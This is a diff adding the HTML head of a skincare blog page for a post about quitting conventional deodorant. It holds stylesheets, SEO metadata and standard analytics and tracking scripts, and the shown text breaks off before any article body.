@@ -1,0 +1,653 @@
+
+<!DOCTYPE html>
+<!--[if IE 7]><html id="ie7" lang="en-US"><![endif]-->
+<!--[if IE 8]><html id="ie8" lang="en-US"><![endif]-->
+<!--[if !(IE 7) | !(IE 8)  ]><!--><html lang="en-US"><!--<![endif]-->
+<head>
+<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=TkpeDNuoEBKvfrDtG8KN54oAuO6OmvZMCQlzEPIfvw7XzEDfAJiuMIMvYmM3QMNruQLx_8_D8axtPe4nGmeI9cez24pJNJztqTmmVN6vWpV4UvA0eetfvc6nBezWvE2mcWFYtuCOzig5IIu34WCKpw" charset="UTF-8"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-NRNNP9X');</script>
+<style>article,aside,details,figcaption,figure,footer,header,hgroup,nav,section{display:block}
+audio,canvas,video{display:inline-block;*display:inline;*zoom:1}
+audio:not([controls]){display:none}
+[hidden]{display:none}
+html{font-size:100%;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}
+html,button,input,select,textarea{font-family:sans-serif;color:#222}
+body{margin:0;font-size:.95em;line-height:1.6em}
+a{text-decoration:none}
+a:focus{outline:0}
+a:hover,a:active{outline:0}
+abbr[title]{border-bottom:1px dotted}
+b,strong{font-weight:bold}
+blockquote{margin:1em 40px}
+dfn{font-style:italic}
+hr{display:block;height:1px;border:0;border-top:1px solid #ccc;margin:1em 0;padding:0}
+ins{background:#ff9;color:#000;text-decoration:none}
+mark{background:#ff0;color:#000;font-style:italic;font-weight:bold}
+pre,code,kbd,samp{font-family:monospace,serif;_font-family:'courier new',monospace;font-size:1em}
+pre{white-space:pre;white-space:pre-wrap;word-wrap:break-word}
+q{quotes:none}
+q:before,q:after{content:"";content:none}
+small{font-size:85%}
+sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
+sup{top:-0.5em}
+sub{bottom:-0.25em}
+h1,h2,h3,h4,h5,h6{padding:0;margin:0}
+ul,ol{margin:0;padding:0;display:block;list-style:none}
+dd{margin:0 0 0 40px}
+nav ul,nav ol{list-style:none;list-style-image:none;margin:0;padding:0}
+img{border:0;-ms-interpolation-mode:bicubic;vertical-align:middle}
+svg:not(:root){overflow:hidden}
+figure{margin:0}
+form{margin:0}
+fieldset{border:0;margin:0;padding:0}
+label{cursor:pointer}
+legend{border:0;*margin-left:-7px;padding:0;white-space:normal}
+button,input,select,textarea{font-size:100%;margin:0;vertical-align:baseline;*vertical-align:middle}
+button,input{line-height:normal}
+button,input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button;*overflow:visible}
+button[disabled],input[disabled]{cursor:default}
+input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0;*width:13px;*height:13px}
+input[type="search"]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}
+input[type="search"]::-webkit-search-decoration,input[type="search"]::-webkit-search-cancel-button{-webkit-appearance:none}
+button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}
+textarea{overflow:auto;vertical-align:top;resize:vertical}
+input:invalid,textarea:invalid{background-color:#f0dddd}
+input{background:0;outline:0;border:0}
+table{border-collapse:collapse;border-spacing:0}
+td{vertical-align:top}
+.chromeframe{margin:.2em 0;background:#ccc;color:black;padding:.2em 0}
+@font-face{font-family:'icons';src:url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/atlantic-icons.eot?9413646320279380509");src:url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/atlantic-icons.eot?9413646320279380509?#iefix") format("embedded-opentype"),url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/atlantic-icons.woff?9413646320279380509") format("woff"),url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/atlantic-icons.ttf?9413646320279380509") format("truetype"),url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/atlantic-icons.svg?9413646320279380509#atlantic-icons") format("svg");font-weight:normal;font-style:normal}
+@font-face{font-family:'TheanoDidotRegular';src:url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/TheanoDidot-Regular-webfont.eot?9413646320279380509");src:url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/TheanoDidot-Regular-webfont.eot?9413646320279380509#iefix") format("embedded-opentype"),url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/TheanoDidot-Regular-webfont.woff?9413646320279380509") format("woff"),url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/TheanoDidot-Regular-webfont.ttf?9413646320279380509") format("truetype"),url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/TheanoDidot-Regular-webfont.svg?9413646320279380509#TheanoDidotRegular") format("svg");font-weight:bold;font-style:normal}
+@font-face{font-family:'Novel';src:url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/novel.woff?9413646320279380509") format("woff");font-style:normal}
+@font-face{font-family:'BellMT';src:url("//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/BellMT.woff?9413646320279380509") format("woff");font-style:normal}
+a{color:#a3a3a3}
+a:hover{color:#222}
+*{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
+input::-ms-clear{display:block}
+input[type="text"],input[type="email"],input[type="number"],input[type="password"],textarea{-webkit-appearance:none;border-radius:0}
+input[type="text"]::-webkit-input-placeholder,input[type="email"]::-webkit-input-placeholder,input[type="number"]::-webkit-input-placeholder,input[type="password"]::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:#bbb}
+input[type="text"]:-moz-placeholder,input[type="email"]:-moz-placeholder,input[type="number"]:-moz-placeholder,input[type="password"]:-moz-placeholder,textarea:-moz-placeholder{color:#bbb}
+input[type="text"]::-moz-placeholder,input[type="email"]::-moz-placeholder,input[type="number"]::-moz-placeholder,input[type="password"]::-moz-placeholder,textarea::-moz-placeholder{color:#bbb}
+input[type="text"]:-ms-input-placeholder,input[type="email"]:-ms-input-placeholder,input[type="number"]:-ms-input-placeholder,input[type="password"]:-ms-input-placeholder,textarea:-ms-input-placeholder{color:#bbb}
+.lt-ie9 input[type="password"]{font-family:Arial,sans-serif!important}
+textarea{background-color:#fff}
+body{color:#000;font-family:"Work Sans",sans-serif;background-color:#fff}
+.clear{clear:both}
+#nav-2017{width:100%;height:50px;background:#FFF;margin:auto;position:fixed;top:0;left:0;z-index:9998!important;border-bottom:1px solid #e5e5e5}
+#nav-2017 li a{text-decoration:none;color:#333}
+#nav-2017 li a:hover{color:#999}
+#nav-2017 .main-nav .main{float:left;width:80%;height:50px;line-height:50px}
+#nav-2017 .main-nav #logo{float:left;padding:0 20px 0 50px}
+#nav-2017 .main-nav #logo img{width:41px}
+#nav-2017 .main-nav .main li{float:left;padding:0 10px;text-transform:uppercase;font-size:14px;letter-spacing:.1em}
+#nav-2017 .main-nav .main li:first-child{padding-right:0}
+#nav-2017 .main-nav .main li li{padding:0!important}
+#nav-2017 .main-nav .shop-nav{width:20%;float:left;text-align:right;padding-right:30px}
+#nav-2017 .main-nav .shop-nav li{float:right;padding:0 10px 0 0;width:24px!important;display:block;height:24px;text-align:right;margin-right:10px!important}
+#nav-2017 .main-nav .shop-nav li:first-child{margin-right:30px!important}
+#nav-2017 .shop-nav li a{width:24px;display:block;border:1px solid #FFF}
+#nav-2017 .shop-nav img{width:24px!important;display:block;padding-top:12px}
+#nav-2017 .main-nav .main-nav{float:left}
+#nav-2017 .main-nav .main li ul{padding-top:0;border-bottom:1px solid #CCC}
+#nav-2017 .main-nav .main li ul li{padding:0 5px;background:#FFF url('//null.null/wp-content/themes/lena/includes/images/line.png') no-repeat;background-position:center bottom;background-size:50%;text-align:center;border-right:1px solid #CCC;border-left:1px solid #CCC;padding:10px 5px}
+#nav-2017 .main-nav .main li ul li:last-child{background-image:none}
+#nav-2017 .main-nav .main li ul li:first-child{border-top:1px solid #CCC}
+#nav-2017 .main-nav .main li ul li:first-child a{padding-top:10px}
+#nav-2017 .main-nav .main li ul li a{padding-top:5px;padding-bottom:15px;display:block}
+#primary_nav_wrap ul{list-style:none;position:relative;margin:0;padding:0}
+#primary_nav_wrap ul li{position:relative;margin:0;padding:0}
+#primary_nav_wrap ul ul{display:none;position:absolute;top:100%;left:-65px;padding:0}
+#primary_nav_wrap ul ul li{float:none;width:200px}
+#primary_nav_wrap ul ul a{line-height:120%;padding:10px 15px}
+#primary_nav_wrap ul ul ul{top:0;left:100%}
+#primary_nav_wrap ul li:hover>ul{display:block}
+.search-bar{background:#fff;width:100%;padding:10px;height:100px;color:#ccc;display:none;position:relative;top:50px;z-index:9999}
+.search-bar input[type="text"]{width:100%;margin:0 auto;background:#f5f5f5;padding:10px 10px;font-size:14px;font-family:"BellMT",serif;outline-style:none;box-shadow:none;border-color:transparent;border:1px solid #CCC!important;z-index:9997}
+.search-bar input[type="text"]::placeholder{color:#999;text-transform:uppercase}
+.search-bar input[type="image"]{width:24px;height:24px;position:absolute;padding:0;top:17px;right:17px;z-index:9999}
+.pure-life-header{clear:both;padding:75px 0 50px 0;margin-bottom:50px;background:#FFF;width:100%;font-family:"Novel",Arial!important;text-align:center;color:#4d4d4d}
+.pure-life-header a{color:#4d4d4d}
+.pure-life-header h1{font-size:60px;padding:0 20px 40px 20px;text-transform:uppercase;letter-spacing:.3em;font-family:"Novel",Arial!important}
+.pure-life-header h2{font-size:18px;text-transform:uppercase;letter-spacing:.1em;background:#FFF;padding:0 60px;margin:auto;display:inline-block;width:auto!important;max-width:90%;position:relative;z-index:2;font-family:"Novel",Arial!important}
+.pure-life-header h2 a:before{content:'\0020\0020\2022\0020'}
+.pure-life-header h2 a:first-child:before{content:''}
+.pure-life-header .border{background:#4d4d4d;width:100%;height:1px;margin-top:-13px;position:relative;z-index:1}
+@media screen and (min-width:968px){#nav-2017 .main-nav .main li ul{padding-top:15px}
+.search-bar{background:#FFF;width:202px;border:1px solid #CCC;padding:0;height:37px;color:#ccc;display:none;position:absolute;top:6px;right:140px;z-index:9999}
+.search-bar input[type="text"]{width:200px;height:35px;margin:0 auto;background:#f5f5f5;outline-style:none;box-shadow:none;border-color:transparent;border:1px solid #ccc;padding:0;font-size:14px;font-family:"BellMT",serif;line-height:14px;padding-left:10px}
+.search-bar input[type="text"]::placeholder{color:#999;text-transform:uppercase}
+.search-bar input[type="image"]{width:24px;position:absolute;top:5px;right:5px;padding:0;text-align:center}}@media screen and (max-width:967px){#nav-2017{position:absolute}
+#nav-2017 .main-nav .main li ul{padding-top:0}
+#nav-2017 #logo{display:none}
+#nav-2017 .main-nav .main{width:70%;padding-left:10px}
+#nav-2017 .main-nav .main li{font-size:10px;padding:0 6px}
+#nav-2017 .main-nav .shop-nav{width:30%;float:right}
+#nav-2017 .main-nav .shop-nav li{padding:10px!important}
+#nav-2017 .main-nav .shop-nav li img{padding-top:0}
+#nav-2017 .main-nav .shop-nav li:first-child{margin-right:0!important}
+.pure-life-header{width:100%!important;padding:100px 0 0 0;margin-bottom:0}
+.pure-life-header .border{display:none}
+.pure-life-header h1{font-size:42px}
+.pure-life-header h2{display:none!important}
+#primary_nav_wrap ul ul{display:none;position:absolute;top:100%;left:0;padding:0}}@media(min-width:1200px){.section-blog-wide{width:1000px}}.entry-title,.entry-title a{line-height:32px!important}</style>
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<link rel="profile" href="https://gmpg.org/xfn/11"/>
+<link rel="pingback" href="https://null.null/xmlrpc.php"/>
+<link rel="shortcut icon" href="//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/p.png?11068149966580658484" type="image/png"/>
+<link href="//cdn.shopify.com/s/files/1/0874/6120/t/5/assets/favicon.png?11068149966580658484" rel="shortcut icon"/>
+<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '126324621400207');
+fbq('track', 'PageView');</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=126324621400207&ev=PageView&noscript=1"/></noscript>
+<title>I Broke Up With My Toxic Deodorant: Here&#039;s How I Did It | Primally Pure</title>
+<meta name="description" content="Our in-house how-to girl, Sarah, is sharing her personal experience when she broke up with her toxic deodorant and 3 tips to make the breakup even easier!"/>
+<meta name="robots" content="index, follow"/>
+<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
+<link rel="canonical" href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/"/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:type" content="article"/>
+<meta property="og:title" content="I Broke Up With My Toxic Deodorant: Here&#039;s How I Did It | Primally Pure"/>
+<meta property="og:description" content="Our in-house how-to girl, Sarah, is sharing her personal experience when she broke up with her toxic deodorant and 3 tips to make the breakup even easier!"/>
+<meta property="og:url" content="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/"/>
+<meta property="og:site_name" content="The Primally Pure Skincare Blog"/>
+<meta property="article:publisher" content="http://www.facebook.com/primallypure"/>
+<meta property="article:published_time" content="2020-08-13T18:14:06+00:00"/>
+<meta property="article:modified_time" content="2020-08-13T18:19:10+00:00"/>
+<meta property="og:image" content="https://i0.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure-Skincare.jpg?fit=1500%2C1000&#038;ssl=1"/>
+<meta property="og:image:width" content="1500"/>
+<meta property="og:image:height" content="1000"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://null.null/#website","url":"https://null.null/","name":"The Primally Pure Skincare Blog","description":"","potentialAction":[{"@type":"SearchAction","target":"https://null.null/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#primaryimage","inLanguage":"en-US","url":"https://i0.wp.com/null.null/wp-content/uploads/2020/08/I-Broke-Up-With-My-Toxic-Deodorant-Heres-How-I-Did-It-Primally-Pure-Skincare.jpg?fit=1500%2C1000&ssl=1","width":1500,"height":1000,"caption":"I Broke Up With My Toxic Deodorant Here's How I Did It | Primally Pure Skincare"},{"@type":"WebPage","@id":"https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#webpage","url":"https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/","name":"I Broke Up With My Toxic Deodorant: Here's How I Did It | Primally Pure","isPartOf":{"@id":"https://null.null/#website"},"primaryImageOfPage":{"@id":"https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/#primaryimage"},"datePublished":"2020-08-13T18:14:06+00:00","dateModified":"2020-08-13T18:19:10+00:00","author":{"@id":"https://null.null/#/schema/person/09f4a24912b0adc8de05c1365c55ad2e"},"description":"Our in-house how-to girl, Sarah, is sharing her personal experience when she broke up with her toxic deodorant and 3 tips to make the breakup even easier!","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/"]}]},{"@type":"Person","@id":"https://null.null/#/schema/person/09f4a24912b0adc8de05c1365c55ad2e","name":"Sarah Navares","image":{"@type":"ImageObject","@id":"https://null.null/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/e1c9d8703cd72b5339700c4c0e15242f?s=96&d=mm&r=g","caption":"Sarah Navares"}}]}</script>
+<link rel='dns-prefetch' href='//cdnjs.cloudflare.com'/>
+<link rel='dns-prefetch' href='//a.omappapi.com'/>
+<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com'/>
+<link rel='dns-prefetch' href='//fonts.googleapis.com'/>
+<link rel='dns-prefetch' href='//s.w.org'/>
+<link rel='dns-prefetch' href='//v0.wordpress.com'/>
+<link rel='dns-prefetch' href='//i0.wp.com'/>
+<link rel='dns-prefetch' href='//i1.wp.com'/>
+<link rel='dns-prefetch' href='//i2.wp.com'/>
+<link rel="alternate" type="application/rss+xml" title="The Primally Pure Skincare Blog &raquo; Feed" href="https://null.null/feed/"/>
+<link rel="alternate" type="application/rss+xml" title="The Primally Pure Skincare Blog &raquo; Comments Feed" href="https://null.null/comments/feed/"/>
+<link rel="alternate" type="application/rss+xml" title="The Primally Pure Skincare Blog &raquo; I BROKE UP WITH MY TOXIC DEODORANT: HERE&#8217;S HOW I DID IT Comments Feed" href="https://null.null/i-broke-up-with-my-toxic-deodorant-heres-how-i-did-it/feed/"/>
+<script data-cfasync="false">var mi_version='7.12.2';
+var mi_track_user=true;
+var mi_no_track_reason='';
+var disableStr='ga-disable-UA-97177519-1';
+function __gaTrackerIsOptedOut(){
+return document.cookie.indexOf(disableStr + '=true') > -1;
+}
+if(__gaTrackerIsOptedOut()){
+window[disableStr]=true;
+}
+function __gaTrackerOptout(){
+document.cookie=disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+window[disableStr]=true;
+}
+if('undefined'===typeof gaOptout){
+function gaOptout(){
+__gaTrackerOptout();
+}}
+if(mi_track_user){
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
+__gaTracker('create', 'UA-97177519-1', 'auto');
+__gaTracker('set', 'forceSSL', true);
+__gaTracker('require', 'displayfeatures');
+__gaTracker('send','pageview');
+}else{
+console.log("");
+(function(){
+var noopfn=function(){
+return null;
+};
+var noopnullfn=function(){
+return null;
+};
+var Tracker=function(){
+return null;
+};
+var p=Tracker.prototype;
+p.get=noopfn;
+p.set=noopfn;
+p.send=noopfn;
+var __gaTracker=function(){
+var len=arguments.length;
+if(len===0){
+return;
+}
+var f=arguments[len-1];
+if(typeof f!=='object'||f===null||typeof f.hitCallback!=='function'){
+console.log('Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason);
+return;
+}
+try {
+f.hitCallback();
+} catch (ex){
+}};
+__gaTracker.create=function(){
+return new Tracker();
+};
+__gaTracker.getByName=noopnullfn;
+__gaTracker.getAll=function(){
+return [];
+};
+__gaTracker.remove=noopfn;
+window['__gaTracker']=__gaTracker;
+})();
+}</script>
+<script>window._wpemojiSettings={"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/null.null\/wp-includes\/js\/wp-emoji-release.min.js"}};
+!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);</script>
+<style>img.wp-smiley,
+img.emoji{display:inline !important;border:none !important;box-shadow:none !important;height:1em !important;width:1em !important;margin:0 .07em !important;vertical-align:-0.1em !important;background:none !important;padding:0 !important;}</style>
+<link rel="stylesheet" type="text/css" href="//null.null/wp-content/cache/wpfc-minified/fokjwwtw/5t8sl.css" media="all"/>
+<style id='wp-block-library-inline-css'>.has-text-align-justify{text-align:justify;}</style>
+<link rel="stylesheet" type="text/css" href="//null.null/wp-content/cache/wpfc-minified/fs8plppa/5t8sl.css" media="all"/>
+<link rel='stylesheet' id='font-awesome-css' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css' type='text/css' media='all'/>
+<link rel="stylesheet" type="text/css" href="//null.null/wp-content/cache/wpfc-minified/kyl25391/5t8sl.css" media="all"/>
+<link rel='stylesheet' id='fontawesome-css' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' type='text/css' media='all'/>
+<link rel='stylesheet' id='google-webfont-css' href='https://fonts.googleapis.com/css?family=Josefin+Sans%3A400%2C400i%2C700%2C700i%7CPlayfair+Display%3A400%2C400i%2C700%2C700i&#038;ver=all' type='text/css' media='all'/>
+<link rel="stylesheet" type="text/css" href="//null.null/wp-content/cache/wpfc-minified/kymfo6jp/5t8sl.css" media="all"/>
+<script>if(document.location.protocol!="https:"){document.location=document.URL.replace(/^http:/i, "https:");}</script><script type='text/javascript' src='https://null.null/wp-includes/js/jquery/jquery.js' id='jquery-js'></script>
+<script id='jetpack_related-posts-js-extra'>var related_posts_js_options={"post_heading":"h4"};</script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js' id='jetpack_related-posts-js'></script>
+<script id='monsterinsights-frontend-script-js-extra'>var monsterinsights_frontend={"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/null.null","hash_tracking":"false"};</script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend.min.js' id='monsterinsights-frontend-script-js'></script>
+<script type='text/javascript' src='https://null.null/wp-content/plugins/simple-masonry-layout/js/modernizr.custom.js' id='modernizr-script-js'></script>
+<link rel="https://api.w.org/" href="https://null.null/wp-json/"/><link rel="alternate" type="application/json" href="https://null.null/wp-json/wp/v2/posts/6632"/><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://null.null/xmlrpc.php?rsd"/>
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://null.null/wp-includes/wlwmanifest.xml"/> 
+<link rel='shortlink' href='https://wp.me/p7gahp-1IY'/>
+<link rel="alternate" type="application/json+oembed" href="https://null.null/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnull.null%2Fi-broke-up-with-my-toxic-deodorant-heres-how-i-did-it%2F"/>
+<link rel="alternate" type="text/xml+oembed" href="https://null.null/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnull.null%2Fi-broke-up-with-my-toxic-deodorant-heres-how-i-did-it%2F&#038;format=xml"/>
+<style>a.pinit-button.custom span{background-image:url("https://null.null/wp-content/uploads/2017/05/PP_Pin_Button_@2x_opt.3.png");}
+.pinit-hover{opacity:1 !important;filter:alpha(opacity=100) !important;}
+a.pinit-button{border-bottom:0 !important;box-shadow:none !important;margin-bottom:0 !important;}
+a.pinit-button::after{display:none;}</style>
+<style>img#wpstats{display:none}</style>
+<!--[if lt IE 9]><script src="https://html5shim.googlecode.com/svn/trunk/html5.js" type="text/javascript"></script><![endif]-->
+<style id="custom-background-css">body.custom-background{background-color:#ffffff;}</style>
+<link rel="icon" href="https://i0.wp.com/null.null/wp-content/uploads/2015/10/fav.jpg?fit=32%2C32&#038;ssl=1" sizes="32x32"/>
+<link rel="icon" href="https://i0.wp.com/null.null/wp-content/uploads/2015/10/fav.jpg?fit=192%2C192&#038;ssl=1" sizes="192x192"/>
+<link rel="apple-touch-icon" href="https://i0.wp.com/null.null/wp-content/uploads/2015/10/fav.jpg?fit=180%2C180&#038;ssl=1"/>
+<meta name="msapplication-TileImage" content="https://i0.wp.com/null.null/wp-content/uploads/2015/10/fav.jpg?fit=270%2C270&#038;ssl=1"/>
+<link rel="stylesheet" type="text/css" href="//null.null/wp-content/cache/wpfc-minified/1zw0cs1p/5t950.css" media="all"/>
+<style>h1{color:#000000;}
+h2{color:#000000;}
+h3{color:#333333;}
+h4{color:#333333;}
+h5{color:#555555;}
+h6{color:#555555;}
+a{color:#000000;}
+a:hover{color:#666666;}
+.nav, .nav li, .nav ul ul, .nav .menu, .menu-click{background:#ffffff;}
+.nav a,
+.nav ul li.has-sub > a:after,
+.nav ul ul li.has-sub > a:after,
+.menu-click:before{color:#000000;}
+.nav a:hover,
+.nav .current-menu-item > a,
+.nav .current-menu-ancestor > a,
+.nav .current_page_item > a,
+.nav .current_page_ancestor > a,
+.menu-open:before{color:#666666;}
+.sc-flex-direction-nav li a.sc-flex-next .fa,
+.sc-flex-direction-nav li a.sc-flex-prev .fa{color:#000000;}
+.flex-control-nav li a:hover,
+.flex-control-nav li a.flex-active,
+.sc-flex-control-nav li a.sc-flex-active,
+.sc-flex-control-nav li a:hover,
+.pagination a:hover,
+.pagination .current{background:#000000;}
+button,
+.post-button,
+.input-button,
+input[type=submit]{background:#999592;border:1px solid #999592;color:#ffffff;}
+.sideform-button{color:#ffffff !important;}
+button:hover,
+.post-button:hover,
+.input-button:hover,
+input[type=submit]:hover{background:#666666;border:1px solid #666666;color:#ffffff;}
+.sideform-button:hover{color:#ffffff !important;}
+body{color:#262626;}
+.article .page-title{color:#000000;}
+.article .post-title a{color:#000000;}
+.article .post-title a:hover{color:#666666 !important;}
+.side-widget h3{color:#000000;}
+.footer-widget h4{color:#000000;}
+.footer{background:#ffffff;}
+.footer{color:#262626;}
+.flex-caption{background:#ffffff;}
+.flex-caption h3, .flex-caption p, .flex-caption .post-date, .flex-caption a{color:#000000;}
+.flex-direction-nav li a.flex-next .fa, .flex-direction-nav li a.flex-prev .fa{color:#000000;}
+.accordion-title{background-color:#999592;color:#ffffff;}
+.accordion-title:before{color:#ffffff;}
+.accordion-open{background-color:#666666;color:#ffffff;}
+.accordion-open:before{color:#ffffff;}
+ul.social-icons .fa-twitter{background:#000000;}
+ul.social-icons .fa-facebook{background:#000000;}
+ul.social-icons .fa-envelope{background:#000000;}
+ul.social-icons .fa-rss{background:#000000;}
+ul.social-icons .fa-google-plus{background:#000000;}
+ul.social-icons .fa-flickr{background:#000000;}
+ul.social-icons .fa-linkedin{background:#000000;}
+ul.social-icons .fa-youtube-play{background:#000000;}
+ul.social-icons .fa-vimeo-square{background:#000000;}
+ul.social-icons .fa-instagram{background:#000000;}
+ul.social-icons .fa-plus{background:#000000;}
+ul.social-icons .fa-pinterest-p{background:#000000;}
+ul.social-icons .fa-tumblr{background:#000000;}
+ul.social-icons .fa-twitter:hover{background:#269dd5;}
+ul.social-icons .fa-facebook:hover{background:#0c42b2;}
+ul.social-icons .fa-envelope:hover{background:#aaaaaa;}
+ul.social-icons .fa-rss:hover{background:#f49000;}
+ul.social-icons .fa-google-plus:hover{background:#fd3000;}
+ul.social-icons .fa-flickr:hover{background:#fc0077;}
+ul.social-icons .fa-linkedin:hover{background:#0d5a7b;}
+ul.social-icons .fa-youtube-play:hover{background:#ff0000;}
+ul.social-icons .fa-vimeo-square:hover{background:#00c1f8;}
+ul.social-icons .fa-instagram:hover{background:#194f7a;}
+ul.social-icons .fa-plus:hover{background:#00c4fd;}
+ul.social-icons .fa-pinterest-p:hover{background:#c70505;}
+ul.social-icons .fa-tumblr:hover{background:#304d6b;}
+ul.ace-header-social-icons .fa-rss, ul.ace-social-icons .fa-rss{color:#000000;}
+ul.ace-header-social-icons .fa-twitter, ul.ace-social-icons .fa-twitter{color:#000000;}
+ul.ace-header-social-icons .fa-facebook, ul.ace-social-icons .fa-facebook{color:#000000;}
+ul.ace-header-social-icons .fa-pinterest-p, ul.ace-social-icons .fa-pinterest-p{color:#000000;}
